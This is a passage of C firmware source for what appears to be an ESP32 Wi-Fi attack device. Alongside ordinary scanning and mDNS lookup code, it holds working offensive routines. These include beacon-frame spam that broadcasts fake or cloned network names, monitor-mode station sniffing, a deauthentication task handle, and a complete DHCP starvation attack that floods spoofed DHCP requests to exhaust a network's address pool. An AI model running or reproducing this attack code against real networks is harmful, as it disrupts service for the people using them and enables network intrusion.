        esp_wifi_get_channel(&primary_channel, &second_channel);
        ds_param_set_ie[2] = primary_channel; // Set the current channel

        // Add HE Capabilities (for Wi-Fi 6 detection)
        uint8_t *he_capabilities_ie = &ds_param_set_ie[3];
        he_capabilities_ie[0] = 0xFF; // Vendor-Specific IE tag (802.11ax capabilities)
        he_capabilities_ie[1] = 0x0D; // Length of HE Capabilities (13 bytes)

        // Wi-Fi Alliance OUI (00:50:6f) for 802.11ax (Wi-Fi 6)
        he_capabilities_ie[2] = 0x50; // OUI byte 1
        he_capabilities_ie[3] = 0x6f; // OUI byte 2
        he_capabilities_ie[4] = 0x9A; // OUI byte 3 (OUI type)

        // Wi-Fi 6 HE Capabilities: a simplified example of capabilities
        he_capabilities_ie[5] = 0x00;  // HE MAC capabilities info (placeholder)
        he_capabilities_ie[6] = 0x08;  // HE PHY capabilities info (supports 80 MHz)
        he_capabilities_ie[7] = 0x00;  // Other HE PHY capabilities
        he_capabilities_ie[8] = 0x00;  // More PHY capabilities (placeholder)
        he_capabilities_ie[9] = 0x40;  // Spatial streams info (2x2 MIMO)
        he_capabilities_ie[10] = 0x00; // More PHY capabilities
        he_capabilities_ie[11] = 0x00; // Even more PHY capabilities
        he_capabilities_ie[12] = 0x01; // Final PHY capabilities (Wi-Fi 6 capabilities set)

        size_t packet_size = (38 + ssid_len + 12 + 3 + 13); // Adjust packet size

        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
        if (err != ESP_OK) {
            printf("Failed to send beacon frame: %s\n", esp_err_to_name(err));
            return err;
        }

        vTaskDelay(pdMS_TO_TICKS(10)); // Delay between channel hops
    }

    return ESP_OK;
}

void wifi_manager_stop_beacon() {
    if (beacon_task_running) {
        printf("Stopping beacon transmission...\n");
        TERMINAL_VIEW_ADD_TEXT("Stopping beacon transmission...\n");

        // Stop the beacon task
        if (beacon_task_handle != NULL) {
            vTaskDelete(beacon_task_handle);
            beacon_task_handle = NULL;
            beacon_task_running = false;
        }

        // Turn off RGB indicator
        rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);

        // Stop WiFi completely
        esp_wifi_stop();
        vTaskDelay(pdMS_TO_TICKS(500)); // Give some time for WiFi to stop

        // Reset WiFi mode
        esp_wifi_set_mode(WIFI_MODE_AP);

        // Now restart services
        ap_manager_init();
    } else {
        printf("No beacon transmission running.\n");
        TERMINAL_VIEW_ADD_TEXT("No beacon transmission running.\n");
    }
}

void wifi_manager_start_ip_lookup() {
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK || ap_info.rssi == 0) {
        printf("Not connected to an Access Point.\n");
        TERMINAL_VIEW_ADD_TEXT("Not connected to an Access Point.\n");
        return;
    }

    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(esp_netif_get_handle_from_ifkey("WIFI_STA_DEF"), &ip_info) ==
        ESP_OK) {
        printf("Connected.\nProceeding with IP lookup...\n");
        TERMINAL_VIEW_ADD_TEXT("Connected.\nProceeding with IP lookup...\n");

        int device_count = 0;
        struct DeviceInfo devices[MAX_DEVICES];
        (void)devices;

        for (int s = 0; s < NUM_SERVICES; s++) {
            int retries = 0;
            mdns_result_t *mdnsresult = NULL;

            if (mdnsresult == NULL) {
                while (retries < 5 && mdnsresult == NULL) {
                    mdns_query_ptr(services[s].query, "_tcp", 2000, 30, &mdnsresult);

                    if (mdnsresult == NULL) {
                        retries++;
                        TERMINAL_VIEW_ADD_TEXT("Retrying mDNS query for service: %s (Attempt %d)\n",
                                               services[s].query, retries);
                        printf("Retrying mDNS query for service: %s (Attempt %d)\n",
                               services[s].query, retries);
                        vTaskDelay(pdMS_TO_TICKS(500));
                    }
                }
            }

            if (mdnsresult != NULL) {
                printf("mDNS query succeeded for service: %s\n", services[s].query);
                TERMINAL_VIEW_ADD_TEXT("mDNS query succeeded for service: %s\n", services[s].query);

                mdns_result_t *current_result = mdnsresult;
                while (current_result != NULL && device_count < MAX_DEVICES) {
                    char ip_str[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, &current_result->addr->addr.u_addr.ip4, ip_str,
                              INET_ADDRSTRLEN);

                    printf("Device at: %s\n", ip_str);
                    printf("  Name: %s\n", current_result->hostname);
                    printf("  Type: %s\n", services[s].type);
                    printf("  Port: %u\n", current_result->port);
                    TERMINAL_VIEW_ADD_TEXT("Device at: %s\n", ip_str);
                    TERMINAL_VIEW_ADD_TEXT("  Name: %s\n", current_result->hostname);
                    TERMINAL_VIEW_ADD_TEXT("  Type: %s\n", services[s].type);
                    TERMINAL_VIEW_ADD_TEXT("  Port: %u\n", current_result->port);
                    device_count++;

                    current_result = current_result->next;
                }

                mdns_query_results_free(mdnsresult);
            } else {
                printf("Failed to find devices for service: %s after %d retries\n",
                       services[s].query, retries);
                TERMINAL_VIEW_ADD_TEXT("Failed to find devices for service: %s after %d retries\n",
                                       services[s].query, retries);
            }
        }
    } else {
        printf("Can't recieve network interface info.\n");
        TERMINAL_VIEW_ADD_TEXT("Can't recieve network interface info.\n");
    }

    printf("IP Scan Done.\n");
    TERMINAL_VIEW_ADD_TEXT("IP Scan Done...\n");
}

void wifi_manager_connect_wifi(const char *ssid, const char *password) {
    wifi_config_t wifi_config = {
        .sta = {
            .threshold.authmode = strlen(password) > 8 ? WIFI_AUTH_WPA2_PSK : WIFI_AUTH_OPEN,
            .pmf_cfg = {.capable = true, .required = false},
        },
    };

    // Copy SSID and password safely
    strlcpy((char *)wifi_config.sta.ssid, ssid, sizeof(wifi_config.sta.ssid));
    strlcpy((char *)wifi_config.sta.password, password, sizeof(wifi_config.sta.password));

    // Ensure clean start state
    esp_wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(500));
    xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT);

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_STA, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    int retry_count = 0;
    const int max_retries = 5;
    bool connected = false;

    while (retry_count < max_retries && !connected) {
        esp_err_t ret = esp_wifi_connect();
        if (ret == ESP_ERR_WIFI_CONN) {
            ret = ESP_OK; // Already connecting, handled elsewhere
        }

        if (ret == ESP_OK) {
            EventBits_t bits = xEventGroupWaitBits(wifi_event_group, 
                WIFI_CONNECTED_BIT, pdFALSE, pdTRUE, pdMS_TO_TICKS(8000));
            
            if (bits & WIFI_CONNECTED_BIT) {
                connected = true;
                break;
            }
        }

        if (!connected) {
            esp_wifi_disconnect();
            vTaskDelay(pdMS_TO_TICKS(1000));
            retry_count++;
        }
    }

    if (!connected) {
        TERMINAL_VIEW_ADD_TEXT("Failed after %d attempts\n", max_retries);
        printf("Connection failed after %d attempts\n", max_retries);
        esp_wifi_disconnect();
    }
}

void wifi_beacon_task(void *param) {
    const char *ssid = (const char *)param;

    // Array to store lines of the chorus
    const char *rickroll_lyrics[] = {"Never gonna give you up",
                                     "Never gonna let you down",
                                     "Never gonna run around and desert you",
                                     "Never gonna make you cry",
                                     "Never gonna say goodbye",
                                     "Never gonna tell a lie and hurt you"};
    int num_lines = 5;
    int line_index = 0;

    int IsRickRoll = ssid != NULL ? (strcmp(ssid, "RICKROLL") == 0) : false;
    int IsAPList = ssid != NULL ? (strcmp(ssid, "APLISTMODE") == 0) : false;

    while (1) {
        if (IsRickRoll) {
            wifi_manager_broadcast_ap(rickroll_lyrics[line_index]);

            line_index = (line_index + 1) % num_lines;
        } else if (IsAPList) {
            for (int i = 0; i < ap_count; i++) {
                wifi_manager_broadcast_ap((const char *)scanned_aps[i].ssid);
                vTaskDelay(10 / portTICK_PERIOD_MS);
            }
        } else {
            wifi_manager_broadcast_ap(ssid);
        }

        vTaskDelay(settings_get_broadcast_speed(&G_Settings) / portTICK_PERIOD_MS);
    }
}

void wifi_manager_start_beacon(const char *ssid) {
    if (!beacon_task_running) {
        ap_manager_stop_services();
        printf("Starting beacon transmission...\n");
        TERMINAL_VIEW_ADD_TEXT("Starting beacon transmission...\n");
        configure_hidden_ap();
        esp_wifi_start();
        xTaskCreate(wifi_beacon_task, "beacon_task", 2048, (void *)ssid, 5, &beacon_task_handle);
        beacon_task_running = true;
        rgb_manager_set_color(&rgb_manager, 0, 255, 0, 0, false);
    } else {
        printf("Beacon transmission already running.\n");
        TERMINAL_VIEW_ADD_TEXT("Beacon transmission already running.\n");
    }
}

// Function to provide access to the last scan results
void wifi_manager_get_scan_results_data(uint16_t *count, wifi_ap_record_t **aps) {
    *count = ap_count;
    *aps = scanned_aps;
}

void wifi_manager_start_scan_with_time(int seconds) {
    ap_manager_stop_services();
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true
    };

    rgb_manager_set_color(&rgb_manager, -1, 50, 255, 50, false);

    printf("WiFi Scan started\n");
    printf("Please wait %d Seconds...\n", seconds);
    TERMINAL_VIEW_ADD_TEXT("WiFi Scan started\n");
    {
        char buf[64]; snprintf(buf, sizeof(buf), "Please wait %d Seconds...\n", seconds);
        TERMINAL_VIEW_ADD_TEXT(buf);
    }

    esp_err_t err = esp_wifi_scan_start(&scan_config, false);
    if (err != ESP_OK) {
        printf("WiFi scan failed to start: %s\n", esp_err_to_name(err));
        TERMINAL_VIEW_ADD_TEXT("WiFi scan failed to start\n");
        return;
    }

    vTaskDelay(pdMS_TO_TICKS(seconds * 1000));

    wifi_manager_stop_scan();
    ESP_ERROR_CHECK(esp_wifi_stop());
    // ESP_ERROR_CHECK(ap_manager_start_services()); // Removed: Rely on caller (handle_combined_scan) to restart AP services
}

// Station Scan Channel Hopping Callback
static void scansta_channel_hop_timer_callback(void *arg) {
    if (!scansta_hopping_active) return; // Check if hopping should be active

    scansta_current_channel = (scansta_current_channel % SCANSTA_MAX_WIFI_CHANNEL) + 1;
    esp_wifi_set_channel(scansta_current_channel, WIFI_SECOND_CHAN_NONE);
    // ESP_LOGI(TAG, "Station Scan Hopped to Channel: %d", scansta_current_channel); // Optional: for debugging
}

// Start the channel hopping timer for station scanning
static esp_err_t start_scansta_channel_hopping(void) {
    if (scansta_channel_hop_timer != NULL) {
        ESP_LOGW(TAG, "Scansta channel hop timer already exists. Stopping and deleting first.");
        esp_timer_stop(scansta_channel_hop_timer);
        esp_timer_delete(scansta_channel_hop_timer);
        scansta_channel_hop_timer = NULL;
    }

    scansta_current_channel = 1; // Start from channel 1
    esp_wifi_set_channel(scansta_current_channel, WIFI_SECOND_CHAN_NONE); // Set initial channel

    esp_timer_create_args_t timer_args = {
        .callback = scansta_channel_hop_timer_callback,
        .name = "scansta_channel_hop"
    };

    esp_err_t err = esp_timer_create(&timer_args, &scansta_channel_hop_timer);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to create scansta channel hop timer: %s", esp_err_to_name(err));
        return err;
    }

    err = esp_timer_start_periodic(scansta_channel_hop_timer, SCANSTA_CHANNEL_HOP_INTERVAL_MS * 1000);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start scansta channel hop timer: %s", esp_err_to_name(err));
        esp_timer_delete(scansta_channel_hop_timer); // Clean up timer if start fails
        scansta_channel_hop_timer = NULL;
        return err;
    }

    scansta_hopping_active = true;
    ESP_LOGI(TAG, "Station Scan Channel Hopping Started.");
    return ESP_OK;
}

// Stop the channel hopping timer for station scanning
static void stop_scansta_channel_hopping(void) {
    if (scansta_channel_hop_timer) {
        esp_timer_stop(scansta_channel_hop_timer);
        esp_timer_delete(scansta_channel_hop_timer);
        scansta_channel_hop_timer = NULL;
        scansta_hopping_active = false;
        ESP_LOGI(TAG, "Station Scan Channel Hopping Stopped.");
    }
}

// Function to specifically start station scanning with channel hopping
void wifi_manager_start_station_scan() {
    // Ensure we have a list of APs to compare against first
    if (scanned_aps == NULL || ap_count == 0) {
        printf("No APs scanned previously. Performing initial scan...\n");
        TERMINAL_VIEW_ADD_TEXT("Scanning APs first...\n");

        // Perform a synchronous scan
        ap_manager_stop_services(); // Stop other services that might interfere
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
        ESP_ERROR_CHECK(esp_wifi_start());

        wifi_scan_config_t scan_config = {
            .ssid = NULL,
            .bssid = NULL,
            .channel = 0,
            .show_hidden = true,
            // Use a reasonable scan time
            .scan_time = {.active.min = 450, .active.max = 500, .passive = 500}
        };

        esp_err_t err = esp_wifi_scan_start(&scan_config, true); // Block until scan done

        if (err == ESP_OK) {
            // Get the results directly, similar to wifi_manager_stop_scan()
            uint16_t initial_ap_count = 0;
            err = esp_wifi_scan_get_ap_num(&initial_ap_count);
            if (err == ESP_OK) {
                 printf("Initial scan found %u access points\n", initial_ap_count);
                 TERMINAL_VIEW_ADD_TEXT("Initial scan found %u APs\n", initial_ap_count);
                if (initial_ap_count > 0) {
                    if (scanned_aps != NULL) {
                        free(scanned_aps);
                        scanned_aps = NULL;
                    }
                    scanned_aps = calloc(initial_ap_count, sizeof(wifi_ap_record_t));
                    if (scanned_aps == NULL) {
                        printf("Failed to allocate memory for AP info\n");
                        ap_count = 0;
                    } else {
                        uint16_t actual_ap_count = initial_ap_count;
                        err = esp_wifi_scan_get_ap_records(&actual_ap_count, scanned_aps);
                        if (err != ESP_OK) {
                            printf("Failed to get AP records: %s\n", esp_err_to_name(err));
                            free(scanned_aps);
                            scanned_aps = NULL;
                            ap_count = 0;
                        } else {
                             ap_count = actual_ap_count;

                              // ---- ADD THIS BLOCK START ----
                              printf("--- Known AP BSSIDs for Station Scan ---\n");
                              for (int k = 0; k < ap_count; k++) {
                                  printf("[%d] BSSID: %02X:%02X:%02X:%02X:%02X:%02X (SSID: %.*s)\n", k,
                                         scanned_aps[k].bssid[0], scanned_aps[k].bssid[1],
                                         scanned_aps[k].bssid[2], scanned_aps[k].bssid[3],
                                         scanned_aps[k].bssid[4], scanned_aps[k].bssid[5],
                                         32, scanned_aps[k].ssid); // Print SSID for context
                              }
                              printf("----------------------------------------\n");
                              // ---- ADD THIS BLOCK END ----
                         }
                     }
                 } else {
                      printf("Initial scan found no access points\n");
                      ap_count = 0;
                 }
            } else {
                printf("Failed to get AP count after initial scan: %s\n", esp_err_to_name(err));
                TERMINAL_VIEW_ADD_TEXT("Failed get AP count\n");
                 ap_count = 0;
            }

        } else {
            printf("Initial AP scan failed: %s\n", esp_err_to_name(err));
            TERMINAL_VIEW_ADD_TEXT("Initial AP scan failed.\n");
            ap_count = 0; // Ensure ap_count reflects failure
        }

        // Stop STA mode before setting monitor mode
        ESP_ERROR_CHECK(esp_wifi_stop());
        // Note: AP Manager services are not restarted here, as monitor mode is intended next
    } else {
         printf("Using previously scanned AP list (%d APs).\n", ap_count);
         TERMINAL_VIEW_ADD_TEXT("Using cached AP list.\n");
    }
    
    // Build list of unique channels for channel hopping
    if (scansta_channel_list) { free(scansta_channel_list); scansta_channel_list = NULL; }
    scansta_channel_list_len = 0;
    scansta_channel_list = calloc(ap_count, sizeof(int));
    if (scansta_channel_list) {
        for (int k = 0; k < ap_count; k++) {
            int ch = scanned_aps[k].primary;
            bool found = false;
            for (size_t m = 0; m < scansta_channel_list_len; m++) {
                if (scansta_channel_list[m] == ch) { found = true; break; }
            }
            if (!found) { scansta_channel_list[scansta_channel_list_len++] = ch; }
        }
    }
    scansta_channel_list_idx = 0;

    // Now start monitor mode with the callback
    wifi_manager_start_monitor_mode(wifi_stations_sniffer_callback);
    // Start channel hopping for station scan
    start_scansta_channel_hopping();
    printf("Started Station Scan (Channel Hopping Enabled)...\n");
    TERMINAL_VIEW_ADD_TEXT("Started Station Scan (Hopping)...\n");
}

// Print combined AP/Station scan results in ASCII chart
void wifi_manager_scanall_chart() {
    if (ap_count == 0) {
        printf("No APs found during scan.\n");
        TERMINAL_VIEW_ADD_TEXT("No APs found during scan.\n");
        return;
    }

    printf("\n--- Combined AP and Station Scan Results ---\n\n");
    TERMINAL_VIEW_ADD_TEXT("\n--- Combined AP/STA Scan Results ---\n\n");

    const char* ap_header_top =    "┌──────────────────────────────────┬───────────────────┬──────┬───────────┐";
    const char* ap_header_mid =    "│ SSID                             │ BSSID             │ Chan │ Company   │";
    const char* ap_header_bottom = "├──────────────────────────────────┼───────────────────┼──────┼───────────┤";
    const char* ap_format =        "│ %-32.32s │ %02X:%02X:%02X:%02X:%02X:%02X │ %-4d │ %-9.9s │";
    const char* ap_separator =     "├──────────────────────────────────┼───────────────────┼──────┼───────────┤";
    const char* ap_footer =        "└──────────────────────────────────┴───────────────────┴──────┴───────────┘";
    const char* sta_format =       "│   -> STA: %02X:%02X:%02X:%02X:%02X:%02X                                             │"; // Formatted station line


    // Print Header Once
    printf("%s\n", ap_header_top);
    printf("%s\n", ap_header_mid);
    printf("%s\n", ap_header_bottom);
    TERMINAL_VIEW_ADD_TEXT("%s\n", ap_header_top);
    TERMINAL_VIEW_ADD_TEXT("%s\n", ap_header_mid);
    TERMINAL_VIEW_ADD_TEXT("%s\n", ap_header_bottom);


    for (uint16_t i = 0; i < ap_count; i++) {
        char sanitized_ssid[33];
        sanitize_ssid_and_check_hidden(scanned_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));

        ECompany company = match_bssid_to_company(scanned_aps[i].bssid);
        const char *company_str = "Unknown";
        switch (company) {
        case COMPANY_DLINK: company_str = "DLink"; break;
        case COMPANY_NETGEAR: company_str = "Netgear"; break;
        case COMPANY_BELKIN: company_str = "Belkin"; break;
        case COMPANY_TPLINK: company_str = "TPLink"; break;
        case COMPANY_LINKSYS: company_str = "Linksys"; break;
        case COMPANY_ASUS: company_str = "ASUS"; break;
        case COMPANY_ACTIONTEC: company_str = "Actiontec"; break;
        default: company_str = "Unknown"; break;
        }

        // Print AP details line
        char ap_details_line[200];
        snprintf(ap_details_line, sizeof(ap_details_line), ap_format, sanitized_ssid,
                 scanned_aps[i].bssid[0], scanned_aps[i].bssid[1], scanned_aps[i].bssid[2],
                 scanned_aps[i].bssid[3], scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
                 scanned_aps[i].primary, company_str);
        printf("%s\n", ap_details_line);
        TERMINAL_VIEW_ADD_TEXT("%s\n", ap_details_line);

        bool station_found_for_ap = false;
        // Find and print associated stations for this AP
        for (int j = 0; j < station_count; j++) {
            if (memcmp(station_ap_list[j].ap_bssid, scanned_aps[i].bssid, 6) == 0) {
                // Print station MAC using the new format
                char sta_details_line[100];
                snprintf(sta_details_line, sizeof(sta_details_line), sta_format,
                         station_ap_list[j].station_mac[0], station_ap_list[j].station_mac[1],
                         station_ap_list[j].station_mac[2], station_ap_list[j].station_mac[3],
                         station_ap_list[j].station_mac[4], station_ap_list[j].station_mac[5]);
                printf("%s\n", sta_details_line);
                TERMINAL_VIEW_ADD_TEXT("%s\n", sta_details_line);
                station_found_for_ap = true; // Mark that we printed at least one station
            }
        }

        (void)station_found_for_ap;

        // Print separator line below the AP (and its stations) if it's not the last AP
        if (i < ap_count - 1) {
            printf("%s\n", ap_separator);
            TERMINAL_VIEW_ADD_TEXT("%s\n", ap_separator);
        }
    }

    // Print Footer Once
    printf("%s\n", ap_footer);
    TERMINAL_VIEW_ADD_TEXT("%s\n", ap_footer);

    printf("\n--- End of Results ---\n\n");
    TERMINAL_VIEW_ADD_TEXT("--- End of Results ---\n\n");
}

bool wifi_manager_stop_deauth_station(void) {
    if (deauth_station_task_handle != NULL) {
        vTaskDelete(deauth_station_task_handle);
        deauth_station_task_handle = NULL;
        ap_manager_start_services();
        return true;
    }
    return false;
}

// Helper function to sanitize SSID and handle hidden networks
static void sanitize_ssid_and_check_hidden(const uint8_t* input_ssid, char* output_buffer, size_t buffer_size) {
    char temp_ssid[33];
    memcpy(temp_ssid, input_ssid, 32);
    temp_ssid[32] = '\0';

    if (strlen(temp_ssid) == 0) {
        snprintf(output_buffer, buffer_size, "(Hidden)");
    } else {
        int len = strlen(temp_ssid);
        int out_idx = 0;
        for (int k = 0; k < len && out_idx < buffer_size - 1; k++) {
            char c = temp_ssid[k];
            output_buffer[out_idx++] = (c >= 32 && c <= 126) ? c : '.';
        }
        output_buffer[out_idx] = '\0';
    }
}

// Add an SSID to the beacon list
void wifi_manager_add_beacon_ssid(const char *ssid) {
    if (g_beacon_list_count >= BEACON_LIST_MAX) {
        printf("Beacon list full\n");
        return;
    }
    if (strlen(ssid) > BEACON_SSID_MAX_LEN) {
        printf("SSID too long\n");
        return;
    }
    for (int i = 0; i < g_beacon_list_count; ++i) {
        if (strcmp(g_beacon_list[i], ssid) == 0) {
            printf("SSID already in list: %s\n", ssid);
            return;
        }
    }
    strcpy(g_beacon_list[g_beacon_list_count++], ssid);
    printf("Added SSID to beacon list: %s\n", ssid);
}

// Remove an SSID from the beacon list
void wifi_manager_remove_beacon_ssid(const char *ssid) {
    for (int i = 0; i < g_beacon_list_count; ++i) {
        if (strcmp(g_beacon_list[i], ssid) == 0) {
            for (int j = i; j < g_beacon_list_count - 1; ++j) {
                strcpy(g_beacon_list[j], g_beacon_list[j + 1]);
            }
            --g_beacon_list_count;
            printf("Removed SSID from beacon list: %s\n", ssid);
            return;
        }
    }
    printf("SSID not found in list: %s\n", ssid);
}

// Clear the beacon list
void wifi_manager_clear_beacon_list(void) {
    g_beacon_list_count = 0;
    printf("Cleared beacon list\n");
}

// Show the beacon list
void wifi_manager_show_beacon_list(void) {
    printf("Beacon list (%d entries):\n", g_beacon_list_count);
    for (int i = 0; i < g_beacon_list_count; ++i) {
        printf("  %d: %s\n", i, g_beacon_list[i]);
    }
}

// Start beacon spam using the saved list
void wifi_manager_start_beacon_list(void) {
    if (g_beacon_list_count == 0) {
        printf("No SSIDs in beacon list\n");
        return;
    }
    // Ensure any existing beacon spam is stopped
    wifi_manager_stop_beacon();
    // Notify user that list-based beacon spam is starting
    printf("Starting beacon spam list (%d SSIDs)...\n", g_beacon_list_count);
    TERMINAL_VIEW_ADD_TEXT("Starting beacon spam list (%d SSIDs)...\n", g_beacon_list_count);
    // Launch the beacon list task
    xTaskCreate(wifi_beacon_list_task, "beacon_list", 2048, NULL, 5, &beacon_task_handle);
    beacon_task_running = 1;
    rgb_manager_set_color(&rgb_manager, 0, 255, 0, 0, false);
}

// Task for cycling through beacon list
static void wifi_beacon_list_task(void *param) {
    (void)param;
    while (beacon_task_handle) {
        for (int i = 0; i < g_beacon_list_count; ++i) {
            wifi_manager_broadcast_ap(g_beacon_list[i]);
            vTaskDelay(pdMS_TO_TICKS(settings_get_broadcast_speed(&G_Settings)));
        }
    }
    vTaskDelete(NULL);
}

// Add DHCP starvation support start
static volatile bool dhcp_starve_running = false;
static volatile uint32_t dhcp_starve_packets_sent = 0;
static TaskHandle_t dhcp_starve_task_handle = NULL;
static TaskHandle_t dhcp_starve_display_task_handle = NULL;

#pragma pack(push,1)
typedef struct {
    uint8_t op, htype, hlen, hops;
    uint32_t xid;
    uint16_t secs, flags;
    uint32_t ciaddr, yiaddr, siaddr, giaddr;
    uint8_t chaddr[16];
    uint8_t sname[64];
    uint8_t file[128];
    uint8_t options[312];
} dhcp_packet_t;
#pragma pack(pop)

static void dhcp_starve_task(void *param) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    int broadcast = 1;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(67), .sin_addr.s_addr = htonl(INADDR_BROADCAST) };
    while (dhcp_starve_running) {
        dhcp_packet_t pkt;
        memset(&pkt, 0, sizeof(pkt));
        pkt.op = 1; pkt.htype = 1; pkt.hlen = 6;
        pkt.xid = esp_random();
        pkt.flags = htons(0x8000);
        esp_fill_random(pkt.chaddr, 6);
        pkt.chaddr[0] &= 0xFE; pkt.chaddr[0] |= 0x02;
        pkt.options[0] = 99; pkt.options[1] = 130; pkt.options[2] = 83; pkt.options[3] = 99;
        pkt.options[4] = 53; pkt.options[5] = 1; pkt.options[6] = 1; pkt.options[7] = 255;
        sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr*)&addr, sizeof(addr));
        dhcp_starve_packets_sent++;
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    close(sock);
    vTaskDelete(NULL);
}

static void dhcp_starve_display_task(void *param) {
    uint32_t prev_total = 0;
    while (dhcp_starve_running) {
        vTaskDelay(pdMS_TO_TICKS(5000));
        uint32_t total = dhcp_starve_packets_sent;
        uint32_t interval = total - prev_total;
        prev_total = total;
        uint32_t pps = interval / 5;
        printf("DHCP-Starve rate: %lu pps, Total: %lu packets\n", 
               (unsigned long)pps, (unsigned long)total);
    }
    vTaskDelete(NULL);
}

void wifi_manager_start_dhcpstarve(int threads) {
    // Prevent starting DHCP starvation when not associated to an AP
    EventBits_t bits = xEventGroupGetBits(wifi_event_group);
    if (!(bits & WIFI_CONNECTED_BIT)) {
        printf("Not connected to an AP\n");
        TERMINAL_VIEW_ADD_TEXT("Not connected to an AP\n");
        return;
    }
    if (dhcp_starve_running) {
        printf("DHCP-Starve already running\n");
        return;
    }
    dhcp_starve_running = true;
    dhcp_starve_packets_sent = 0;
    xTaskCreate(dhcp_starve_task, "dhcp_starve", 4096, NULL, 5, &dhcp_starve_task_handle);
    xTaskCreate(dhcp_starve_display_task, "dhcp_disp", 2048, NULL, 5, &dhcp_starve_display_task_handle);
}

void wifi_manager_stop_dhcpstarve(void) {
    if (!dhcp_starve_running) {
        printf("DHCP-Starve not running\n");
        return;
    }
    dhcp_starve_running = false;
}

void wifi_manager_dhcpstarve_display(void) {
    printf("Packets sent so far: %lu\n", (unsigned long)dhcp_starve_packets_sent);
}

void wifi_manager_dhcpstarve_help(void) {
    printf("Usage: dhcpstarve start [threads]\\n       dhcpstarve stop\\n       dhcpstarve display\\n");
}
